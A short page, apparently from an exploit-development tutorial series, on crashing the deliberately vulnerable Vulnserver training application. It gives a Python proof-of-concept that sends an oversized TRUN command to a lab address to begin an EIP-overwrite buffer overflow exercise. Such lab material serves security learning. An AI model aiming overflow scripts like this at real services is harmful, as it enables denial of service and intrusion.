---
title: "TRUN EIP Overwrite"
layout: home
permalink: /vulnserver/trun/
collection: vulnserver
sidebar:
  nav: "main"
entries_layout: grid
classes: wide
---

Begin by using the below proof of concept script, developed by using the SPIKE fuzzer to identify a hole in the Vulnserver TRUN command.
	
	Vulnserver TRUN Python Script: POC
		#!/usr/bin/python
		import socket
		import os
		import sys
		
		crash="A"*5000
		
		buffer="TRUN /.:/"
		buffer+=crash
		
		print "[*] Sending evil TRUN request to VulnServer, OS-42279"
		expl = socket.socket ( socket.AF_INET, socket.SOCK_STREAM )
		expl.connect(("192.168.83.128", 9999))
		expl.send(buffer)
    expl.close()
